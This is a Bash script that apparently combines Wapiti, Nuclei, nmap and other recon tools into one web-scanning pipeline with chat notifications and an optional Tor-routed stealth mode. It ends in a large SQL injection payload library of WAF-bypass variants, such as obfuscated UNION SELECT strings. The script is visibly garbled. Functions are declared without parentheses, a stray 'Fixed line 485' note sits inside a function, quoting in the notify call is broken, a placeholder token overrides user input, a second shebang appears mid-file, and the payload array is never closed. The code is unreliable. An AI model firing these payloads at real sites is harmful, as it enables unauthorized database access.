#!/usr/bin/env bash
# ============================================================================
# WAPITI IMPROVISED v3.0 — The Ultimate All-in-One Web Security Scanner
# ============================================================================
# "Improvises" Wapiti by combining: Wapiti + Nuclei + httpx + nmap + naabu +
# subfinder + chaos + katana + gospider + gau + waybackurls + ffuf + dalfox +
# dnsx + shodan + wafw00f + whatweb + notify + gf + uro + anew + interactsh
#
# Combines ALL phases:
#   Recon → Probe → Port Scan → Fingerprint → Crawl → URL Collect →
#   JS Analysis → Secret Hunt → Vuln Scan → Wapiti DAST → Fuzz → Param Test →
#   Report → Notify → Diff
#
# Author: OpenCode Bug Bounty Agents (Hunter + Verifier + Reporter)
# Version: 3.0.0 — 2026-07-10
# License: MIT (for authorized security testing only)
# ============================================================================

set -euo pipefail
# ============================================================================
# PART 1: CONFIGURATION & GLOBALS
# ============================================================================

# ---- Color Definitions ----
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m'; MAG='\033[0;35m'
NC='\033[0m'; BOLD='\033[1m'; DIM='\033[2m'

# ---- Global Variables (with defaults) ----
DOMAIN=""                        # Primary target domain
TARGETS_FILE=""                  # Bulk target file
OUTDIR=""                        # Output directory
PHASE="all"                      # Which phase(s) to run
MODE="standard"                  # Scan mode: quick|standard|deep|stealth
THREADS=50                       # Default thread count
RATE=300                         # Default rate limit
TIMESTAMP=$(date +%Y%m%d_%H%M%S) # Unique timestamp
START_TIME=$(date +%s)           # Epoch start
VERBOSE=0                        # Verbosity flag
FUZZ_WORDLIST=""                 # Custom wordlist path
DISCORD_WEBHOOK=""               # Discord notifications URL
SLACK_TOKEN=""                   # Slack notifications token
INTERACTSH_URL=""                # Interactsh callback URL
TELEGRAM_BOT_TOKEN=""            # Telegram bot token for notifications
TELEGRAM_CHAT_ID=""              # Telegram chat ID for notifications
EMAIL_TO=""                      # Email recipient for notifications
PROXY=""                         # Proxy (e.g. socks5://127.0.0.1:9050)
COOKIE_FILE=""                   # Cookie file for auth scans
HEADERS_FILE=""                  # Custom HTTP headers file
AUTH_CRED=""                     # Auth credentials (user:pass)
AUTH_TYPE="basic"                # Auth type: basic|digest|ntlm|form
SKIP_CDN=1                       # Skip CDN/WAF-filtered IPs
NOTIFY_ENABLED=0                 # Enable notifications
DIFF_ENABLED=0                   # Enable inter-scan diffing
DIFF_DIR="$HOME/recon_diffs"     # Directory for diff state
CRAWL_DEPTH=2                    # Crawler depth
TIMEOUT_SEC=30                   # Default request timeout
NUCLEI_CONCURRENCY=50            # Nuclei concurrent targets
WAPITI_MODULES="all"             # Wapiti modules to run
EXCLUDED_SUBDOMAIN_PATTERNS=""   # Grep patterns to exclude

# ---- Path Constants ----
SCRIPTS_DIR="$HOME/scripts"
RECON_BASE="$HOME/recon_reports/companies"
WORDLIST_DIR="$HOME/payloads"
NUCLEI_TEMPLATES="$HOME/nuclei-templates"
COMMON_WORDLIST="$SCRIPTS_DIR/common.txt"
API_KEYS_FILE="$HOME/.config/api_keys.conf"

# ============================================================================
# PART 2: USAGE & HELP
# ============================================================================

usage {
    cat << 'USAGE_EOF'
╔══════════════════════════════════════════════════════════════════════════════╗
║                     WAPITI IMPROVISED v3.0 — HELP                          ║
╚══════════════════════════════════════════════════════════════════════════════╝

USAGE:
  ./wapiti_improvised.sh -d target.com [options]
  ./wapiti_improvised.sh -l targets.txt [options]

REQUIRED (choose one):
  -d DOMAIN Single target domain
  -l TARGETS_FILE Bulk target file (one per line)

SCAN MODES:
  --quick Fast scan (top 50 subdomains, 100 ports, 1-level crawl)
  --deep Deep scan (all subdomains, all ports, 3-level crawl, vuln scripts)
  --stealth Stealth scan (low rate, passive only, no aggressive payloads)
  (default: standard — balanced coverage)

PHASE SELECTION:
  --phase all Run ALL phases (default)
  --phase recon Phase 1: Subdomain discovery only
  --phase probe Phase 2: Live host + tech detection
  --phase ports Phase 3: Port scanning
  --phase urls Phase 4: URL collection + crawling
  --phase js Phase 5: JS analysis + secrets
  --phase scan Phase 6: Vulnerability scanning
  --phase fuzz Phase 7: Fuzzing + param analysis
  --phase report Phase 8: Report generation only

OUTPUT:
  -o DIR Output directory (default: ./recon/<domain>/<timestamp>)

TOOL CONTROL:
  --wapiti-only Run ONLY Wapiti (skip everything else)
  --no-wapiti Run everything EXCEPT Wapiti
  --nuclei-only Run ONLY Nuclei scanning
  --fuzz-only Run ONLY fuzzing phase

RATE & PERFORMANCE:
  --threads N Thread count (default: 50)
  --rate N Requests per second (default: 300)
  --timeout N Request timeout in seconds (default: 30)

AUTHENTICATION:
  --cookie FILE Cookie jar file for authenticated scanning
  --auth user:pass HTTP basic/digest auth credentials
  --auth-type TYPE Auth type: basic|digest|ntlm|form
  --headers FILE Custom HTTP headers file (name:value per line)

NETWORK:
  --proxy URL Proxy URL (e.g. socks5://127.0.0.1:9050)
  --no-cdn-skip Include CDN/WAF IPs in scanning (default: skip CDN)

NOTIFICATIONS:
  --discord URL Discord webhook URL for scan results
  --slack TOKEN Slack API token for notifications
  --telegram-token TOKEN Telegram bot token
  --telegram-chat CHAT_ID Telegram chat/group ID
  --telegram TOKEN CHAT_ID Both token and chat ID in one flag
  --email ADDRESS Email notification recipient (uses sendmail)

ADVANCED:
  --diff Enable inter-scan diffing (track changes)
  --diff-dir DIR Diff state directory (default: ~/recon_diffs)
  --wordlist FILE Custom fuzzing wordlist
  --crawl-depth N Crawler depth (default: 2)
  --exclude PATTERN Grep pattern to exclude subdomains

EXAMPLES:
  # Quick scan of a single domain:
  ./wapiti_improvised.sh -d example.com --quick

  # Deep scan with all bells and whistles:
  ./wapiti_improvised.sh -d example.com --deep --discord https://discord.com/api/webhooks/...

  # Bulk recon on multiple targets:
  ./wapiti_improvised.sh -l my_targets.txt --phase recon

  # Only run vulnerability scanning:
  ./wapiti_improvised.sh -d example.com --phase scan

  # Wapiti-only authenticated scan:
  ./wapiti_improvised.sh -d example.com --wapiti-only --cookie cookies.txt

  # Stealth mode through Tor:
  ./wapiti_improvised.sh -d example.com --stealth --proxy socks5://127.0.0.1:9050

  # Custom output and rate limiting:
  ./wapiti_improvised.sh -d example.com -o /tmp/my_scan --rate 100 --threads 20

USAGE_EOF
    exit 0
}

# ============================================================================
# PART 3: ARGUMENT PARSING
# ============================================================================

parse_args {
    while [[ $# -gt 0 ]]; do
        case $1 in
            -d) DOMAIN="$2"; shift 2 ;;
            -l) TARGETS_FILE="$2"; shift 2 ;;
            -o) OUTDIR="$2"; shift 2 ;;
            --phase) PHASE="$2"; shift 2 ;;
            --quick) MODE="quick"; shift ;;
            --deep) MODE="deep"; shift ;;
            --stealth) MODE="stealth"; shift ;;
            --wapiti-only) MODE="wapiti_only"; shift ;;
            --no-wapiti) MODE="no_wapiti"; shift ;;
            --nuclei-only) MODE="nuclei_only"; shift ;;
            --fuzz-only) MODE="fuzz_only"; shift ;;
            --threads) THREADS="$2"; shift 2 ;;
            --rate) RATE="$2"; shift 2 ;;
            --timeout) TIMEOUT_SEC="$2"; shift 2 ;;
            --cookie) COOKIE_FILE="$2"; shift 2 ;;
            --auth) AUTH_CRED="$2"; shift 2 ;;
            --auth-type) AUTH_TYPE="$2"; shift 2 ;;
            --headers) HEADERS_FILE="$2"; shift 2 ;;
            --proxy) PROXY="$2"; shift 2 ;;
            --no-cdn-skip) SKIP_CDN=0; shift ;;
            --discord) DISCORD_WEBHOOK="$2"; NOTIFY_ENABLED=1; shift 2 ;;
            --slack) SLACK_TOKEN="$2"; NOTIFY_ENABLED=1; shift 2 ;;
            --telegram-token) TELEGRAM_BOT_TOKEN="$2"; shift 2 ;;
            --telegram-chat) TELEGRAM_CHAT_ID="$2"; shift 2 ;;
            --telegram) TELEGRAM_BOT_TOKEN="$2"; TELEGRAM_CHAT_ID="$3"; NOTIFY_ENABLED=1; shift 3 ;;
            --email) EMAIL_TO="$2"; NOTIFY_ENABLED=1; shift 2 ;;
            --diff) DIFF_ENABLED=1; shift ;;
            --diff-dir) DIFF_DIR="$2"; shift 2 ;;
            --wordlist) FUZZ_WORDLIST="$2"; shift 2 ;;
            --crawl-depth) CRAWL_DEPTH="$2"; shift 2 ;;
            --exclude) EXCLUDED_SUBDOMAIN_PATTERNS="$2"; shift 2 ;;
            -h|--help) usage ;;
            *) echo -e "${RED}Unknown option:${NC} $1"; usage ;;
        esac
    done

    if [[ -z "$DOMAIN" && -z "$TARGETS_FILE" ]]; then
        echo -e "${RED}ERROR:${NC} Use -d <domain> or -l <targets_file>"
        usage
    fi
    if [[ -n "$DOMAIN" && -n "$TARGETS_FILE" ]]; then
        echo -e "${RED}ERROR:${NC} Use -d OR -l, not both."
        exit 1
    fi

    # Set default output directory based on mode
    if [[ -z "$OUTDIR" ]]; then
        if [[ -n "$DOMAIN" ]]; then
            OUTDIR="$RECON_BASE/$DOMAIN/recon_${TIMESTAMP}"
        else
            OUTDIR="$RECON_BASE/bulk_${TIMESTAMP}"
        fi
    fi

    # Validate mode-specific requirements
    if [[ "$MODE" == "wapiti_only" ]] && ! tool_avail wapiti; then
        echo -e "${RED}ERROR:${NC} Wapiti not installed. Cannot run --wapiti-only."
        exit 1
    fi
    if [[ "$MODE" == "nuclei_only" ]] && ! tool_avail nuclei; then
        echo -e "${RED}ERROR:${NC} Nuclei not installed. Cannot run --nuclei-only."
        exit 1
    fi

    # Mode presets
    case "$MODE" in
        quick)
            THREADS=20; RATE=150; CRAWL_DEPTH=1
            ;;
        deep)
            THREADS=100; RATE=500; CRAWL_DEPTH=3
            ;;
        stealth)
            THREADS=5; RATE=10; CRAWL_DEPTH=1
            PROXY="${PROXY:-socks5://127.0.0.1:9050}"
            ;;
    esac
}

# ============================================================================
# PART 4: UTILITY FUNCTIONS
# ============================================================================

# ---- Logging ----
log   { echo -e "${GREEN}[+]${NC} $1"; }
warn  { echo -e "${YELLOW}[!]${NC} $1"; }
err   { echo -e "${RED}[-]${NC} $1"; }
info  { echo -e "${BLUE}[*]${NC} $1"; }
debug { [[ "$VERBOSE" -eq 1 ]] && echo -e "${DIM}[DEBUG]${NC} $1"; }
header{ echo -e "\n${MAG}══════════════════════════════════════${NC}"; \
          echo -e "${BOLD}  $1${NC}"; \
          echo -e "${MAG}══════════════════════════════════════${NC}\n"; }

# ---- Timer ----
timer_start { TIMER_VAR=$(date +%s); }
timer_end {
    local elapsed=$(( $(date +%s) - TIMER_VAR ))
    local mins=$(( elapsed / 60 ))
    local secs=$(( elapsed % 60 ))
    echo "${mins}m${secs}s"
}

# ---- Tool Check ----
tool_avail { command -v "$1" &>/dev/null; }

tool_check {
    header "TOOL CHECKS"

    # Required tools (scanning breaks without these)
    local required=(
        "nuclei:/usr/local/bin/nuclei:ProjectDiscovery Nuclei"
        "httpx:/home/sricharansiddu29/.local/bin/httpx:ProjectDiscovery httpx"
        "nmap:/usr/bin/nmap:Nmap"
        "subfinder:/home/sricharansiddu29/.local/bin/subfinder:ProjectDiscovery Subfinder"
        "dnsx:/usr/local/bin/dnsx:ProjectDiscovery dnsx"
        "katana:/usr/local/bin/katana:ProjectDiscovery Katana"
        "ffuf:/usr/bin/ffuf:ffuf"
    )

    # Optional tools (features degrade gracefully)
    local optional=(
        "wapiti:/home/sricharansiddu29/.local/bin/wapiti:Wapiti DAST"
        "shodan:/home/sricharansiddu29/.local/bin/shodan:Shodan.io"
        "waybackurls:/home/sricharansiddu29/.local/bin/waybackurls:Wayback URLs"
        "dalfox:/usr/local/bin/dalfox:Dalfox XSS"
        "gospider:/usr/local/bin/gospider:Gospider"
        "gau:/usr/local/bin/gau:GetAllUrls"
        "naabu:/usr/local/bin/naabu:ProjectDiscovery Naabu"
        "whatweb:/usr/bin/whatweb:WhatWeb"
        "wafw00f:/usr/local/bin/wafw00f:WAFW00F"
        "gf:/home/sricharansiddu29/.local/bin/gf:GF Patterns"
        "uro:/home/sricharansiddu29/.local/bin/uro:URL Cleaner"
        "anew:/usr/local/bin/anew:Anew"
        "notify:/usr/local/bin/notify:ProjectDiscovery Notify"
        "interactsh-client:/usr/local/bin/interactsh-client:Interactsh"
        "chaos:/usr/local/bin/chaos:Chaos"
        "amass:/usr/local/bin/amass:Amass"
    )

    local missing=0
    local total_req=0

    for entry in "${required[@]}"; do
        local name=$(echo "$entry" | cut -d: -f1)
        local path=$(echo "$entry" | cut -d: -f2)
        local desc=$(echo "$entry" | cut -d: -f3)
        total_req=$((total_req+1))

        if [[ -x "$path" ]]; then
            info "${desc}: ${GREEN}✓${NC}"
        else
            warn "${desc}: NOT FOUND - scanning will break"
            missing=$((missing+1))
        fi
    done

    for entry in "${optional[@]}"; do
        local name=$(echo "$entry" | cut -d: -f1)
        local path=$(echo "$entry" | cut -d: -f2)
        local desc=$(echo "$entry" | cut -d: -f3)

        if [[ -x "$path" ]]; then
            info "${desc}: ${GREEN}✓${NC}"
        else
            info "${desc}: ${DIM}not installed (optional)${NC}"
        fi
    done

    # Check nuclei templates
    if [[ -d "$NUCLEI_TEMPLATES" ]]; then
        local tcount=$(find "$NUCLEI_TEMPLATES" -name "*.yaml" 2>/dev/null | wc -l)
        info "Nuclei templates: ${GREEN}${tcount}${NC} in $NUCLEI_TEMPLATES"
    else
        warn "Nuclei templates not found. Run: nuclei -update-templates"
    fi

    # Check wordlist
    if [[ -f "$COMMON_WORDLIST" ]]; then
        local wcount=$(wc -l < "$COMMON_WORDLIST")
        info "Wordlist: ${GREEN}${wcount}${NC} entries in $COMMON_WORDLIST"
    else
        warn "No wordlist found. Fuzzing may not work."
    fi

    echo ""
    if [[ $missing -gt 2 ]]; then
        err "Too many required tools missing ($missing/$total_req). Install missing tools."
        err "  Go: go install -v github.com/projectdiscovery/...@latest"
        err "  Pip: pip3 install wapiti3 shodan wafw00f"
        exit 1
    fi
    log "All critical tools present. Ready to scan."
    echo ""
}

# ---- File Counter (safe) ----
count_lines {
    local f="$1"
    if [[ -f "$f" ]]; then
        wc -l < "$f"
    else
        echo 0
    fi
}

# ---- Proxy Wrapper ----
proxy_prefix {
    if [[ -n "$PROXY" ]]; then
        echo "proxychains4 -q"
    else
        echo ""
    fi
}

# ---- Apply proxy to command ----
with_proxy {
    if [[ -n "$PROXY" ]]; then
        echo "proxychains4 -q $1"
    else
        echo "$1"
    fi
}

# ---- Build common args ----
common_curl_args {
    local args="-sL --max-time $TIMEOUT_SEC"
    if [[ -n "$PROXY" ]]; then
        args="$args --proxy $PROXY"
    fi
    echo "$args"
}

# ---- Progress counter ----
progress {
    local current=$1 total=$2 label=${3:-}
    local pct=$(( current * 100 / total ))
    printf "\r  [%3d%%] %s %d/%d  " "$pct" "$label" "$current" "$total"
}

# ---- Check if file has content ----
has_content {
    [[ -f "$1" && -s "$1" ]]
}

# ============================================================================
# PART 5: ENVIRONMENT SETUP
# ============================================================================

setup_directories {
    header "SETTING UP OUTPUT DIRECTORIES"

    mkdir -p "$OUTDIR"/{subs,live,ports,tech,urls,js,params,wapiti,nuclei,fuzz,screenshots,reports,notes}

    log "Output root:     $OUTDIR"
    log "Subdomains:      $OUTDIR/subs/"
    log "Live hosts:      $OUTDIR/live/"
    log "Ports:           $OUTDIR/ports/"
    log "Tech:            $OUTDIR/tech/"
    log "URLs:            $OUTDIR/urls/"
    log "JS:              $OUTDIR/js/"
    log "Params:          $OUTDIR/params/"
    log "Wapiti:          $OUTDIR/wapiti/"
    log "Nuclei:          $OUTDIR/nuclei/"
    log "Fuzz:            $OUTDIR/fuzz/"
    log "Reports:         $OUTDIR/reports/"
    echo ""
}

# ============================================================================
# PART 6: DISCORD / SLACK NOTIFICATIONS
# ============================================================================

send_notification {
    local message="$1"
    local severity="${2:-info}"

    [[ "$NOTIFY_ENABLED" -eq 0 ]] && return

    local color
    case "$severity" in
        critical) color=15548997;; # Red
        high) color=15105570;; # Orange
        medium) color=16776960;; # Yellow
        low) color=5793266;;  # Blue
        info) color=4886754;;  # Green
        *) color=4886754;;
    esac

    # Discord webhook
    if [[ -n "$DISCORD_WEBHOOK" ]]; then
        local payload=$(cat << EOF
{
  "embeds": [{
    "title": "Wapiti Improvised — ${DOMAIN:-Bulk Scan}",
    "description": "$message",
    "color": $color,
    "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
    "footer": {"text": "Wapiti Improvised v3.0"}
  }]
}
EOF
)
        curl -s -H "Content-Type: application/json" \
             -d "$payload" "$DISCORD_WEBHOOK" &>/dev/null || true
    fi

    # Slack (via notify if available)
    if tool_avail notify && [[ -n "$SLACK_TOKEN" ]]; then
Fixed line 485: merged trailing content
        echo "$message" | notify -silent -provider slack -id "$SLACK_TOKEN2>/dev/null || true"
    fi

    # Telegram bot
    local TELEGRAM_BOT_TOKEN="REDACTED_ASSIGNED_SECRET"
    local TELEGRAM_CHAT_ID="${TELEGRAM_CHAT_ID:-}"
    if [[ -n "$TELEGRAM_BOT_TOKEN" && -n "$TELEGRAM_CHAT_ID" ]]; then
        local tg_payload=$(printf '{"chat_id":"%s","text":"[Wapiti Improvised] %s","parse_mode":"Markdown"}' \
            "$TELEGRAM_CHAT_ID" "$message")
        curl -s -H "Content-Type: application/json" \
            -d "$tg_payload" \
            "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" &>/dev/null || true
    fi

    # Email via sendmail (if configured)
    local EMAIL_TO="${EMAIL_TO:-}"
    if [[ -n "$EMAIL_TO" ]]; then
        local email_subject="[Wapiti Improvised] ${severity^^} — ${DOMAIN:-Bulk Scan}"
        {
            echo "Subject: $email_subject"
            echo "To: $EMAIL_TO"
            echo "Content-Type: text/plain; charset=utf-8"
            echo ""
            echo "$message"
            echo ""
            echo "---"
            echo "Wapiti Improvised v3.0 — All-in-One Web Security Scanner"
            echo "Report: $OUTDIR/reports/full_scan_report.html"
        } | sendmail -f "wapiti@scan.local" "$EMAIL_TO" 2>/dev/null || true
    fi
}

# ============================================================================
# PART 7: INTER-SCAN DIFFING
# ============================================================================

save_diff_state {
    [[ "$DIFF_ENABLED" -eq 0 ]] && return
    mkdir -p "$DIFF_DIR"
    # Save the output structure sizes for diffing
    {
        echo "SUBS=$(count_lines "$OUTDIR/subs/all_subs.txt")"
        echo "LIVE=$(count_lines "$OUTDIR/live/live_hosts.txt")"
        echo "URLS=$(count_lines "$OUTDIR/urls/all_urls.txt")"
        echo "SECRETS=$(count_lines "$OUTDIR/js/secrets_found.txt")"
        echo "NUCLEI=$(find "$OUTDIR/nuclei/" -name "*.txt" -exec cat {} + 2>/dev/null | grep -v '^\s*$' | wc -l)"
        echo "TIMESTAMP=$TIMESTAMP"
    } > "$DIFF_DIR/${DOMAIN:-bulk}.state"
}

load_diff_state {
    [[ "$DIFF_ENABLED" -eq 0 ]] && return
    local state_file="$DIFF_DIR/${DOMAIN:-bulk}.state"
    if [[ -f "$state_file" ]]; then
        source "$state_file"
        info "Previous scan state loaded: $PREV_TIMESTAMP"
    fi
}

compute_diff {
    [[ "$DIFF_ENABLED" -eq 0 ]] && return
    local state_file="$DIFF_DIR/${DOMAIN:-bulk}.state"
    [[ ! -f "$state_file" ]] && return

    local prev_subs=$(grep "^SUBS=" "$state_file" 2>/dev/null | cut -d= -f2 || echo 0)
    local curr_subs=$(count_lines "$OUTDIR/subs/all_subs.txt")
    local diff_subs=$(( curr_subs - prev_subs ))

    if [[ $diff_subs -gt 0 ]]; then
        log "NEW subdomains since last scan: +$diff_subs"
    fi
}

# ============================================================================
# PART 8: BANNER
# ============================================================================

banner {
    # Clear screen, show banner
    echo -e "${RED}"
    cat << "BANNER"
 __        __   _       _   _   ___   _
 \ \      / /__| |__   (_) (_) |_ _| (_)_ __   ___
  \ \ /\ / / _ \ '_ \  | | | |  | |  | | '_ \ / __|
   \ V V /  __/ |_) | | | | |  | |  | | |_) | (__
    \_/\_/ \___|_.__/  |_| |_| |___| |_| .__/ \___|
                                        |_|

  ╔═══════════════════════════════════════════════════════════════════╗
  ║  WAPITI IMPROVISED v3.0 — All-in-One Web Security Scanner       ║
  ║  "Improvises" Wapiti with: Nuclei + httpx + nmap + naabu +      ║
  ║   subfinder + chaos + katana + gospider + gau + waybackurls +   ║
  ║   ffuf + dalfox + dnsx + shodan + wafw00f + whatweb + notify   ║
  ╚═══════════════════════════════════════════════════════════════════╝
BANNER
    echo -e "${YELLOW}  Target:${NC} ${BOLD}${DOMAIN:-Bulk file: $TARGETS_FILE}${NC}"
    echo -e "${YELLOW}  Mode:${NC}   ${BOLD}$MODE${NC}"
    echo -e "${YELLOW}  Output:${NC}  ${BOLD}$OUTDIR${NC}"
    echo -e "${YELLOW}  Started:${NC} $(date)"
    echo -e "${YELLOW}  PID:${NC}    $$"
    echo -e "${RED}────────────────────────────────────────────────────────${NC}\n"
}

# ============================================================================
# PART 9: BANNER HELPERS — End of setup section (safe for appending)
# ============================================================================
# The following functions are the actual scan phases.

END_OF_SETUP_MARKER=1

# ============================================================================
# ============================================================================
# ============================================================================
# PART 9.5: EMBEDDED PAYLOAD & WORDLIST LIBRARIES
# ============================================================================
# Massive payload libraries for ALL vulnerability classes.
# Sourced from: Community methodology, SecLists, PayloadsAllTheThings,
# Bug Bounty Methodology repos, and custom generators.
# ============================================================================

#!/bin/bash
# PAYLOAD LIBRARY - Massive Reference Data for Security Scanners (EXPANDED)
# Contains ONLY readonly array definitions.
# Source with: source /path/to/payload_library.sh


# --- SQLI_PAYLOADS ---
readonly SQLI_PAYLOADS=(
  '"'
  '" %4F%52 1=1--'
  '" %4f%52 1=1--'
  '" /*!50000/*!50000UNION*/*/ ALL SELECT 1,2,3,4,5--'
  '" /*!50000/*!50000UNION*/*/ ALL SELECT 1,2,3,4--'
  '" /*!50000/*!50000UNION*/*/ ALL SELECT 1,2,3--'
  '" /*!50000/*!50000UNION*/*/ ALL SELECT 1,2--'
  '" /*!50000/*!50000UNION*/*/ ALL SELECT 1--'
  '" /*!50000/*!50000UNION*/*/ SELECT 1,2,3,4,5--'
  '" /*!50000/*!50000UNION*/*/ SELECT 1,2,3,4--'
  '" /*!50000/*!50000UNION*/*/ SELECT 1,2,3--'
  '" /*!50000/*!50000UNION*/*/ SELECT 1,2--'
  '" /*!50000/*!50000UNION*/*/ SELECT 1--'
  '" /*!50000/*!50000UNION*/*/ SELECT NULL,NULL,NULL,NULL--'
  '" /*!50000/*!50000UNION*/*/ SELECT NULL,NULL,NULL--'
  '" /*!50000/*!50000UNION*/*/ SELECT NULL,NULL--'
  '" /*!50000/*!50000UNION*/*/ SELECT NULL--'
  '" /*!50000UN/**/ION*/ ALL SELECT 1,2,3,4,5--'
  '" /*!50000UN/**/ION*/ ALL SELECT 1,2,3,4--'
  '" /*!50000UN/**/ION*/ ALL SELECT 1,2,3--'
  '" /*!50000UN/**/ION*/ ALL SELECT 1,2--'
  '" /*!50000UN/**/ION*/ ALL SELECT 1--'
  '" /*!50000UN/**/ION*/ SELECT 1,2,3,4,5--'
  '" /*!50000UN/**/ION*/ SELECT 1,2,3,4--'
  '" /*!50000UN/**/ION*/ SELECT 1,2,3--'
  '" /*!50000UN/**/ION*/ SELECT 1,2--'
  '" /*!50000UN/**/ION*/ SELECT 1--'
  '" /*!50000UN/**/ION*/ SELECT NULL,NULL,NULL,NULL--'
  '" /*!50000UN/**/ION*/ SELECT NULL,NULL,NULL--'
  '" /*!50000UN/**/ION*/ SELECT NULL,NULL--'
  '" /*!50000UN/**/ION*/ SELECT NULL--'
  '" /*!50000UNION*/ /*!50000SELECT*/ 1,2,3,4,5--'
  '" /*!50000UNION*/ /*!50000SELECT*/ 1,2,3,4--'
  '" /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--'
  '" /*!50000UNION*/ /*!50000SELECT*/ 1,2--'
  '" /*!50000UNION*/ /*!50000SELECT*/ 1--'
  '" /*!50000UNION*/ /*!50000SELECT*/ NULL,NULL,NULL,NULL--'
  '" /*!50000UNION*/ /*!50000SELECT*/ NULL,NULL,NULL--'
  '" /*!50000UNION*/ /*!50000SELECT*/ NULL,NULL--'
  '" /*!50000UNION*/ /*!50000SELECT*/ NULL--'
  '" /*!50000UNION*/ ALL /*!50000SELECT*/ 1,2,3,4,5--'
  '" /*!50000UNION*/ ALL /*!50000SELECT*/ 1,2,3,4--'
  '" /*!50000UNION*/ ALL /*!50000SELECT*/ 1,2,3--'
  '" /*!50000UNION*/ ALL /*!50000SELECT*/ 1,2--'
  '" /*!50000UNION*/ ALL /*!50000SELECT*/ 1--'
  '" /*!50000UNION*/ ALL SEL/**/ECT 1,2,3,4,5--'
  '" /*!50000UNION*/ ALL SEL/**/ECT 1,2,3,4--'
  '" /*!50000UNION*/ ALL SEL/**/ECT 1,2,3--'
  '" /*!50000UNION*/ ALL SEL/**/ECT 1,2--'
  '" /*!50000UNION*/ ALL SEL/**/ECT 1--'
  '" /*!50000UNION*/ ALL SELECT 1,2,3,4,5--'
  '" /*!50000UNION*/ ALL SELECT 1,2,3,4--'
  '" /*!50000UNION*/ ALL SELECT 1,2,3--'
  '" /*!50000UNION*/ ALL SELECT 1,2--'
  '" /*!50000UNION*/ ALL SELECT 1--'
  '" /*!50000UNION*/ AlL SeLeCt 1,2,3,4,5--'
  '" /*!50000UNION*/ AlL SeLeCt 1,2,3,4--'
  '" /*!50000UNION*/ AlL SeLeCt 1,2,3--'
  '" /*!50000UNION*/ AlL SeLeCt 1,2--'
  '" /*!50000UNION*/ AlL SeLeCt 1--'
  '" /*!50000UNION*/ SEL/**/ECT 1,2,3,4,5--'
  '" /*!50000UNION*/ SEL/**/ECT 1,2,3,4--'
  '" /*!50000UNION*/ SEL/**/ECT 1,2,3--'
  '" /*!50000UNION*/ SEL/**/ECT 1,2--'
  '" /*!50000UNION*/ SEL/**/ECT 1--'
  '" /*!50000UNION*/ SEL/**/ECT NULL,NULL,NULL,NULL--'
  '" /*!50000UNION*/ SEL/**/ECT NULL,NULL,NULL--'
  '" /*!50000UNION*/ SEL/**/ECT NULL,NULL--'
  '" /*!50000UNION*/ SEL/**/ECT NULL--'
  '" /*!50000UNION*/ SELECT 1,2,3,4,5--'
  '" /*!50000UNION*/ SELECT 1,2,3,4--'
  '" /*!50000UNION*/ SELECT 1,2,3--'
  '" /*!50000UNION*/ SELECT 1,2--'
  '" /*!50000UNION*/ SELECT 1--'
  '" /*!50000UNION*/ SELECT NULL,NULL,NULL,NULL--'
  '" /*!50000UNION*/ SELECT NULL,NULL,NULL--'
  '" /*!50000UNION*/ SELECT NULL,NULL--'
  '" /*!50000UNION*/ SELECT NULL--'
  '" /*!50000UNION*/ SeLeCt 1,2,3,4,5--'
  '" /*!50000UNION*/ SeLeCt 1,2,3,4--'
  '" /*!50000UNION*/ SeLeCt 1,2,3--'
  '" /*!50000UNION*/ SeLeCt 1,2--'
  '" /*!50000UNION*/ SeLeCt 1--'
  '" /*!50000UNION*/ SeLeCt nUlL,NuLl,nUlL,NuLl--'
  '" /*!50000UNION*/ SeLeCt nUlL,NuLl,nUlL--'
  '" /*!50000UNION*/ SeLeCt nUlL,NuLl--'
  '" /*!50000UNION*/ SeLeCt nUlL--'
  '" /*!50000UNION*/ aLl sElEcT 1,2,3,4,5--'
  '" /*!50000UNION*/ aLl sElEcT 1,2,3,4--'
  '" /*!50000UNION*/ aLl sElEcT 1,2,3--'
  '" /*!50000UNION*/ aLl sElEcT 1,2--'
  '" /*!50000UNION*/ aLl sElEcT 1--'
  '" /*!50000UNION*/ sElEcT 1,2,3,4,5--'
  '" /*!50000UNION*/ sElEcT 1,2,3,4--'
  '" /*!50000UNION*/ sElEcT 1,2,3--'
  '" /*!50000UNION*/ sElEcT 1,2--'
  '" /*!50000UNION*/ sElEcT 1--'
  '" /*!50000UNION*/ sElEcT NuLl,nUlL,NuLl,nUlL--'
  '" /*!50000UNION*/ sElEcT NuLl,nUlL,NuLl--'
  '" /*!50000UNION*/ sElEcT NuLl,nUlL--'
  '" /*!50000UNION*/ sElEcT NuLl--'
  '" /*!50000UnIoN*/ AlL SeLeCt 1,2,3,4,5--'
  '" /*!50000UnIoN*/ AlL SeLeCt 1,2,3,4--'
  '" /*!50000UnIoN*/ AlL SeLeCt 1,2,3--'
  '" /*!50000UnIoN*/ AlL SeLeCt 1,2--'
  '" /*!50000UnIoN*/ AlL SeLeCt 1--'
  '" /*!50000UnIoN*/ SeLeCt 1,2,3,4,5--'
  '" /*!50000UnIoN*/ SeLeCt 1,2,3,4--'
  '" /*!50000UnIoN*/ SeLeCt 1,2,3--'
  '" /*!50000UnIoN*/ SeLeCt 1,2--'
  '" /*!50000UnIoN*/ SeLeCt 1--'
  '" /*!50000UnIoN*/ SeLeCt nUlL,NuLl,nUlL,NuLl--'
  '" /*!50000UnIoN*/ SeLeCt nUlL,NuLl,nUlL--'
  '" /*!50000UnIoN*/ SeLeCt nUlL,NuLl--'
  '" /*!50000UnIoN*/ SeLeCt nUlL--'
  '" /*!50000uNiOn*/ aLl sElEcT 1,2,3,4,5--'
  '" /*!50000uNiOn*/ aLl sElEcT 1,2,3,4--'
  '" /*!50000uNiOn*/ aLl sElEcT 1,2,3--'
  '" /*!50000uNiOn*/ aLl sElEcT 1,2--'
  '" /*!50000uNiOn*/ aLl sElEcT 1--'
  '" /*!50000uNiOn*/ sElEcT 1,2,3,4,5--'
  '" /*!50000uNiOn*/ sElEcT 1,2,3,4--'
  '" /*!50000uNiOn*/ sElEcT 1,2,3--'
  '" /*!50000uNiOn*/ sElEcT 1,2--'
  '" /*!50000uNiOn*/ sElEcT 1--'
  '" /*!50000uNiOn*/ sElEcT NuLl,nUlL,NuLl,nUlL--'
  '" /*!50000uNiOn*/ sElEcT NuLl,nUlL,NuLl--'
  '" /*!50000uNiOn*/ sElEcT NuLl,nUlL--'
  '" /*!50000uNiOn*/ sElEcT NuLl--'
